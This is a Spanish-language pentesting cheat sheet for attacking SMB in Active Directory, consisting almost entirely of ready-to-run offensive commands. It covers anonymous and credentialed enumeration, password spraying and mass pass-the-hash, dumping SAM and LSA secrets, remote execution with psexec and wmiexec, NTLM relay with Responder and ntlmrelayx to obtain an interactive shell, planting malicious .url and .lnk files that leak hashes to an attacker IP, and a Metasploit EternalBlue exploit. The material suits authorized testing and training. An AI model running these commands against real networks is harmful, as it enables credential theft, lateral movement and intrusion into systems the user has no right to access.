## SMB — Enumeración y Explotación en Active Directory

SMB (Server Message Block) opera en los puertos **139/tcp** y **445/tcp** y es uno de los servicios más relevantes en entornos Windows. Expone recursos compartidos, información de usuarios, sesiones activas y en versiones antiguas es directamente explotable. En un pentest de AD es uno de los primeros servicios a atacar.

---

## Enumeración sin credenciales

### Nmap

```shell
# Versión, OS y scripts básicos
nmap -p 139,445 --script smb-protocols,smb-security-mode,smb-os-discovery <ip>

# Enumerar usuarios y recursos compartidos
nmap --script smb-enum-shares,smb-enum-users -p 139,445 <ip>

# Buscar vulnerabilidades conocidas
nmap --script smb-vuln* -p 139,445 <ip>
```

### Sesión nula (null session)

```shell
# Listar recursos compartidos sin credenciales
smbclient -N -L //<ip>/
smbmap -H <ip>
nxc smb <ip> -u '' -p '' --shares
nxc smb <ip> -u 'guest' -p '' --shares

# Enumeración completa con enum4linux-ng
enum4linux-ng -A <ip>
enum4linux-ng -u '' -p '' <ip>
```

### NetBIOS

```shell
nmblookup -A <ip>
nbtscan <ip>
nbtscan -r <red>/24
```

---

## Enumeración con credenciales

### Información del host y dominio

```shell
# Información básica del objetivo
nxc smb <ip> -u <usuario> -p <contraseña>

# Con hash NT (Pass-the-Hash)
nxc smb <ip> -u <usuario> -H <hash_nt>
```

### Usuarios y grupos

```shell
nxc smb <ip> -u <usuario> -p <contraseña> --users
nxc smb <ip> -u <usuario> -p <contraseña> --groups
nxc smb <ip> -u <usuario> -p <contraseña> --rid-brute

# Via RPC
rpcclient -U '<dominio>/<usuario>%<contraseña>' <ip>
rpcclient $> enumdomusers
rpcclient $> enumdomgroups
rpcclient $> queryuser <rid>
rpcclient $> getdompwinfo      # política de contraseñas
```

### Recursos compartidos

```shell
# Listar shares y permisos
nxc smb <ip> -u <usuario> -p <contraseña> --shares
smbmap -H <ip> -u <usuario> -p <contraseña>
smbmap -H <ip> -u <usuario> -p <contraseña> -R --depth 5   # recursivo

# Acceso interactivo a un share
smbclient //<ip>/<share> -U '<usuario>%<contraseña>'
smbclient //<ip>/<share> -U <usuario> --pw-nt-hash <hash_nt>
smbclient //<ip>/<share> -k -U <usuario>          # con ticket Kerberos
```

### Sesiones y usuarios conectados

```shell
nxc smb <ip> -u <usuario> -p <contraseña> --sessions
nxc smb <ip> -u <usuario> -p <contraseña> --loggedon-users
nxc smb <ip> -u <usuario> -p <contraseña> --disks
```

### Módulos útiles de Netexec

```shell
# Buscar contraseñas en archivos de configuración
nxc smb <ip> -u <usuario> -p <contraseña> -M spider_plus

# Volcar SAM (requiere admin local)
nxc smb <ip> -u <usuario> -p <contraseña> --sam

# Volcar LSA secrets (requiere admin local)
nxc smb <ip> -u <usuario> -p <contraseña> --lsa

# Buscar datos ADCS
nxc ldap <ip> -u <usuario> -p <contraseña> -M adcs

# Ejecutar comando remoto (requiere admin)
nxc smb <ip> -u <usuario> -p <contraseña> -x 'whoami'
nxc smb <ip> -u <usuario> -p <contraseña> -X 'Get-Process'  # PowerShell
```

---

## Password Spraying y Fuerza Bruta

```shell
# Spraying con una contraseña contra múltiples usuarios
nxc smb <ip> -u users.txt -p '<contraseña>' --continue-on-success

# Spraying con múltiples contraseñas
nxc smb <ip> -u users.txt -p passwords.txt --continue-on-success

# Pass-the-Hash masivo
nxc smb <ip> -u users.txt -H hashes.txt --continue-on-success

# Contra toda una subred
nxc smb <red>/24 -u <usuario> -p <contraseña> --continue-on-success
```

> ⚠️ Tener cuidado con la política de bloqueo de cuentas antes de hacer spraying. Verificar con `rpcclient $> getdompwinfo` o `nxc smb <ip> -u <usuario> -p <contraseña> --pass-pol`.

---

## Ejecución Remota (Post-explotación)

```shell
# psexec — crea un servicio temporal, ruidoso pero funciona siempre
psexec.py <dominio>/<usuario>:<contraseña>@<ip>
psexec.py <dominio>/<usuario>@<ip> -hashes ':<hash_nt>'

# smbexec — más silencioso que psexec
smbexec.py <dominio>/<usuario>:<contraseña>@<ip>

# wmiexec — usa WMI, no deja rastro en disco
wmiexec.py <dominio>/<usuario>:<contraseña>@<ip>
wmiexec.py <dominio>/<usuario>@<ip> -hashes ':<hash_nt>'

# atexec — via Task Scheduler
atexec.py <dominio>/<usuario>:<contraseña>@<ip> <comando>
```

---

## NTLM Relay

Si SMB signing está deshabilitado, los hashes NTLM capturados se pueden reenviar a otros hosts para autenticarse sin necesidad de crackearlos.

```shell
# 1. Identificar hosts sin SMB signing
nxc smb <red>/24 --gen-relay-list relay_targets.txt

# 2. Deshabilitar SMB y HTTP en Responder para no capturar sino redirigir
sed -i 's/SMB = On/SMB = Off/g' /etc/responder/Responder.conf
sed -i 's/HTTP = On/HTTP = Off/g' /etc/responder/Responder.conf

# 3. Levantar el relay
ntlmrelayx.py -tf relay_targets.txt -smb2support

# 4. Lanzar Responder para capturar hashes
responder -I <interfaz> -dwv

# 5. Si se quiere ejecutar un comando al autenticar via relay
ntlmrelayx.py -tf relay_targets.txt -smb2support -c 'whoami'

# 6. Shell interactiva via relay
ntlmrelayx.py -tf relay_targets.txt -smb2support -i
nc 127.0.0.1 11000
```

---

## Captura de Hashes NTLM via Archivos Maliciosos

Si se puede escribir en un share, se pueden colocar archivos que fuercen autenticación NTLM al ser abiertos:

```shell
# Generar todos los tipos de archivos maliciosos
python3 ntlm_theft.py -g all -s <ip_atacante> -f /tmp/loot

# Subir al share
smbclient //<ip>/<share> -U '<usuario>%<contraseña>'
smb: \> put loot/@loot.url
smb: \> put loot/@loot.lnk

# Capturar el hash con Responder
responder -I <interfaz> -dwv
```

---

## Búsqueda de Contenido Sensible en Shares

```shell
# Buscar archivos con patrones específicos (contraseñas, configs, etc.)
manspider <ip> -u <usuario> -p <contraseña> -d <dominio> \
  --content password passw passwd

# Buscar por extensión
manspider <ip> -u <usuario> -p <contraseña> -d <dominio> \
  -e config xml txt ini

# Descargar todo el contenido de un share recursivamente
smbmap -H <ip> -u <usuario> -p <contraseña> -R <share> -A '.*' -q
```

---

## Vulnerabilidades Conocidas

| Vulnerabilidad | CVE | Versión afectada | Impacto |
| -------------- | --- | ---------------- | ------- |
| EternalBlue | CVE-2017-0144 | Windows 7/2008 R2 sin MS17-010 | RCE sin autenticación |
| PrintNightmare | CVE-2021-1675 | Windows sin parche de julio 2021 | RCE / LPE |
| SMBGhost | CVE-2020-0796 | SMBv3 Windows 10 1903/1909 | RCE sin autenticación |
| SambaCry | CVE-2017-7494 | Samba < 4.6.4 | RCE en Linux |

```shell
# Comprobar EternalBlue
nmap --script smb-vuln-ms17-010 -p 445 <ip>

# Explotar EternalBlue con Metasploit
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <ip>
run
```

---

## Comandos útiles dentro de smbclient

```shell
smbclient //<ip>/<share> -U '<usuario>%<contraseña>'

smb: \> ls                    # listar archivos
smb: \> get <archivo>         # descargar archivo
smb: \> put <archivo>         # subir archivo
smb: \> cd <directorio>       # cambiar directorio
smb: \> recurse ON            # activar modo recursivo
smb: \> prompt OFF            # desactivar confirmaciones
smb: \> mget *                # descargar todo recursivamente
smb: \> mkdir <directorio>    # crear directorio
```

---

> 💡 El orden de prioridad al encontrar SMB en un pentest: (1) null session o guest → (2) spraying con usuarios enumerados → (3) relay si signing está deshabilitado → (4) búsqueda de credenciales en shares → (5) ejecución remota si se obtienen credenciales admin.

---

### Referencias

- https://www.netexec.wiki/
- https://0xdf.gitlab.io/cheatsheets/smb-enum
- https://www.thehacker.recipes/ad/movement/ntlm/relay
- https://github.com/Greenwolf/ntlm_theft
- https://github.com/blacklanternsecurity/manspider
